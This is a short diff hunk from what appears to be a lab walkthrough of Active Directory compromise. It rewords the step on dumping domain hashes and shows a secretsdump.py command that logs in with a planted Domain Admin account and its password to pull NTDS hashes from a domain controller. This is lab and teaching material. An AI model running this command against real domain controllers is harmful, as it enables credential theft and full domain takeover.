@@ -549,7 +549,7 @@ This confirms the user test was added to the Domain Admins group in my lab envir
 
 ## Step 8 - Dumping All Hashes
 
-After creating the new domain user and adding it to the Domain Admins group in my lab, I used that account to dump all hashes from the domain controller.
+After creating the new domain user and adding it to the Domain Admins group in my lab, I used that account to extract NTDS domain hashes from the Domain Controller.
 
 ```bash
 secretsdump.py readteambd.local/test:'@shahin123#!'@192.168.5.134
